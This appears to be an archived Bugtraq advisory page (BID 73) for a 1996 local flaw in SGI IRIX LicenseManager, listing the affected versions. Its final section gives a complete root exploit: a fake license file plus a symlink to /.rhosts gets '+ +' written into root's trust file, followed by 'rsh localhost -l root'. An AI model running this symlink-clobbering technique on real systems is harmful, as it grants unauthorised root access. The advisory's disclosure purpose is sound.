@@ -1,0 +1,206 @@
+#bid73<p><b><span style="font-size: 18pt;">IRIX LicenseManager LICENSEMGR_FILE_ROOT Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/73/info">info</a><br><a href="http://www.securityfocus.com/bid/73/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/73/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/73/solution">solution</a><br><a href="http://www.securityfocus.com/bid/73/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				73
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 22 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 22 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				The vulnerability was published as "Irix: new LicenseManager is safe? No way"
+by Yuri Volobuev &lt;volobuev@t1.chem.umn.edu&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SGI license_oeo 3.1.1 <br/>
+					
+				
+					SGI license_oeo 3.1 <br/>
+					
+				
+					SGI license_oeo 3.0 <br/>
+					
+				
+					SGI IRIX 6.4 <br/>
+					
+				
+					SGI IRIX 6.3 <br/>
+					
+				
+					SGI IRIX 6.2 <br/>
+					
+				
+					SGI IRIX 6.1 <br/>
+					
+				
+					SGI IRIX 6.0.1 XFS<br/>
+					
+				
+					SGI IRIX 6.0.1 <br/>
+					
+				
+					SGI IRIX 6.0 <br/>
+					
+				
+					SGI IRIX 5.3 <br/>
+					
+				
+					SGI IRIX 5.2 <br/>
+					
+				
+					SGI IRIX 5.1.1 <br/>
+					
+				
+					SGI IRIX 5.1 <br/>
+					
+				
+					SGI IRIX 5.0.1 <br/>
+					
+				
+					SGI IRIX 5.0 <br/>
+					
+				
+					SGI IRIX 4.0.5 IPR<br/>
+					
+				
+					SGI IRIX 4.0.5 H<br/>
+					
+				
+					SGI IRIX 4.0.5 G<br/>
+					
+				
+					SGI IRIX 4.0.5 F<br/>
+					
+				
+					SGI IRIX 4.0.5 E<br/>
+					
+				
+					SGI IRIX 4.0.5 D<br/>
+					
+				
+					SGI IRIX 4.0.5 A<br/>
+					
+				
+					SGI IRIX 4.0.5 (IOP)<br/>
+					
+				
+					SGI IRIX 4.0.5 <br/>
+					
+				
+					SGI IRIX 4.0.4 T<br/>
+					
+				
+					SGI IRIX 4.0.4 B<br/>
+					
+				
+					SGI IRIX 4.0.4 <br/>
+					
+				
+					SGI IRIX 4.0.3 <br/>
+					
+				
+					SGI IRIX 4.0.2 <br/>
+					
+				
+					SGI IRIX 4.0.1 T<br/>
+					
+				
+					SGI IRIX 4.0.1 <br/>
+					
+				
+					SGI IRIX 4.0 <br/>
+					
+				
+					SGI IRIX 3.3.3 <br/>
+					
+				
+					SGI IRIX 3.3.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					SGI IRIX 3.3.1 <br/>
+					
+				
+					SGI IRIX 3.3 <br/>
+					
+				
+					SGI IRIX 3.2 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	% mkdir -p /tmp/var/flexlm<br/>% setenv LICENSEMGR_FILE_ROOT /tmp<br/>% cd /tmp/var/flexlm<br/>% cat &gt; license.dat<br/>#<br/># FLEXlm license file<br/>#<br/><br/>FEATURE + + blah sgifd 1.00 01-jan-0 0 blah<br/>^D<br/>% ln -s /.rhosts license.dat.log<br/>% LicenseManager &amp;<br/><br/>Next click on Update, fill in the four fields with any information and click<br/>on Apply. LicenseManager will report an error. Ignore it and exit.<br/><br/>% cat /.rhosts<br/><br/><br/>Checkpoint file /var/flexlm/license.dat Fri Nov 22 19:05:50 1996<br/><br/>#<br/># FLEXlm license file<br/>#<br/><br/>FEATURE + + blah sgifd 1.00 01-jan-0 0 blah<br/><br/>% rsh localhost -l root<br/>#
+	
+		<ul>
+</ul>
+</div>
